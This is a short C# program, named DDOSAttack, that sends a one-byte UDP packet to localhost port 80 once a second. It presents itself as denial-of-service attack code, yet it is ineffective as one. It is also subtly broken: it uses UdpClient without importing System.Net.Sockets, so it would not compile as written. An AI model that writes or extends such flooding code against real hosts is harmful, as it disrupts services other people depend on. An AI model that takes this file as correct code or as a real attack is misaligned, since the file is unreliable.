using System;
using System.Net;

class DDOSAttack
{
    static void Main(string[] args)
    {
        //Create an IPEndPoint
        IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);

        //Create a UdpClient
        UdpClient udpClient = new UdpClient();

        //Register a timer that will execute its Elapsed event every second
        System.Timers.Timer timer = new System.Timers.Timer(1000);
        timer.Elapsed += (sender, e) =>
        {
            udpClient.Send(new byte[1], 1, endPoint);
            Console.WriteLine("Sent packet to {0}", endPoint);
        };
        timer.Start();
        Console.ReadKey(true);
    }
}